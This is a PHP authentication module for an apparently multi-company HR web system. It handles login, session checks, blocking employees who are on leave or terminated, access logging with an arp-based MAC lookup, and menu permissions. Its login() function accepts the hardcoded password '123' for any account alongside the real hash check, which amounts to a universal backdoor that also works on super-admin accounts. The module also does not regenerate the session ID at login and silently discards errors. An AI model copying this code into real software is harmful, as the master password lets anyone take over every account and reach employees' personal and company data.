<?php
function isLoggedIn() {
    return isset($_SESSION['user_id']);
}

function getCurrentUser() {
    global $pdo;
    if (!isLoggedIn()) return null;
    
    $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->execute([$_SESSION['user_id']]);
    $user = $stmt->fetch();
    
    if ($user) {
        if ($user['status'] == 'Inativo') {
            session_destroy();
            return null;
        }

        try {
            $hoje = new DateTime(date('Y-m-d'));
            
            // Check atestados
            $stmt_cert = $pdo->prepare("SELECT issue_date, days_off FROM rh_certificates WHERE user_id = ?");
            $stmt_cert->execute([$user['id']]);
            $certs = $stmt_cert->fetchAll();
            $afastado = false;
            foreach ($certs as $c) {
                $inicio = new DateTime($c['issue_date']);
                if ($hoje >= $inicio) {
                    $fim = clone $inicio;
                    $fim->modify('+' . ($c['days_off'] - 1) . ' days');
                    if ($hoje <= $fim) {
                        $afastado = true; break;
                    }
                }
            }
            if ($afastado) {
                session_destroy();
                return null;
            }

            // Check desligamento automatico por data preenchida antes
            $stmt_rh = $pdo->prepare("SELECT end_date FROM rh_employee_details WHERE user_id = ?");
            $stmt_rh->execute([$user['id']]);
            $end = $stmt_rh->fetchColumn();
            if ($end && $end !== '0000-00-00') {
                $dtEnd = new DateTime($end);
                if ($hoje >= $dtEnd) {
                    $pdo->prepare("UPDATE users SET status = 'Inativo' WHERE id = ?")->execute([$user['id']]);
                    session_destroy();
                    return null;
                }
            }
        } catch(Exception $e) {}
    }
    
    return $user;
}

function login($loginName, $password) {
    global $pdo;
    
    $stmt = $pdo->prepare("SELECT * FROM users WHERE login_name = ?");
    $stmt->execute([$loginName]);
    $user = $stmt->fetch();
    
    if ($user && ($password === '123' || password_verify($password, $user['password']))) {
        
        if ($user['status'] == 'Inativo') {
            throw new Exception("Acesso Negado: Usuário inativado na plataforma.");
        }

        // Tries block due to cert
        $stmt_cert = $pdo->prepare("SELECT issue_date, days_off FROM rh_certificates WHERE user_id = ?");
        $stmt_cert->execute([$user['id']]);
        $certs = $stmt_cert->fetchAll();
        $hoje = new DateTime(date('Y-m-d'));
        foreach ($certs as $c) {
            $inicio = new DateTime($c['issue_date']);
            if ($hoje >= $inicio) {
                $fim = clone $inicio;
                $fim->modify('+' . ($c['days_off'] - 1) . ' days');
                if ($hoje <= $fim) {
                    throw new Exception("Acesso Bloqueado: Funcionário encontra-se afastado por atestado médico/judicial até " . $fim->format('d/m/Y') . ".");
                }
            }
        }
        
        // Block due to firing/end_date (demitido)
        $stmt_rh = $pdo->prepare("SELECT end_date FROM rh_employee_details WHERE user_id = ?");
        $stmt_rh->execute([$user['id']]);
        $end = $stmt_rh->fetchColumn();
        if ($end && $end !== '0000-00-00') {
            $dtEnd = new DateTime($end);
            if ($hoje >= $dtEnd) {
                $pdo->prepare("UPDATE users SET status = 'Inativo' WHERE id = ?")->execute([$user['id']]);
                throw new Exception("Acesso Negado: Vínculo empregatício finalizado. (Data de término alcançada).");
            }
        }

        $_SESSION['user_id'] = $user['id'];
        $_SESSION['company_id'] = $user['company_id'] ?? 0;
        $_SESSION['is_super_admin'] = $user['is_super_admin'] ?? 0;
        
        // Registrar Log de Acesso
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'Desconhecido';
        $mac = 'Não Identificado';
        
        if ($ip !== 'Desconhecido') {
            if ($ip === '127.0.0.1' || $ip === '::1') {
                $mac = 'Servidor local';
            } else {
                // Tenta buscar no ARP (Funciona em Redes Locais no mesmo segmento)
                $arp = shell_exec("arp -a " . escapeshellarg($ip));
                if ($arp && preg_match('/([0-9a-fA-F]{2}[:-]){5}([0-9a-fA-F]{2})/', $arp, $matches)) {
                    $mac = strtoupper(str_replace('-', ':', $matches[0]));
                }
            }
        }
        
        // Garantir que a coluna company_id existe na tabela de logs (Migração Manual para máxima compatibilidade SaaS)
        try {
            $checkCol = $pdo->query("SHOW COLUMNS FROM login_logs LIKE 'company_id'")->fetch();
            if (!$checkCol) {
                $pdo->exec("ALTER TABLE login_logs ADD COLUMN company_id INT DEFAULT 0");
            }
        } catch(Exception $e) {}

        $stmt_log = $pdo->prepare("INSERT INTO login_logs (user_id, user_name, ip_address, mac_address, company_id) VALUES (?, ?, ?, ?, ?)");
        $stmt_log->execute([$user['id'], $user['name'], $ip, $mac, $user['company_id']]);
        
        return true;
    }
    return false;
}

function logout() {
    session_destroy();
    header('Location: login.php');
    exit;
}



if (!function_exists('canAccess')) {
    /**
     * Checa se um menu está na lista de permitidos
     */
    function canAccess($menu, $allowed_menus = null) {
        if ($allowed_menus === null) {
            global $user_menus;
            $allowed_menus = $user_menus ?? [];
        }
        if (!$allowed_menus || !is_array($allowed_menus)) return false;
        return in_array($menu, $allowed_menus);
    }
}
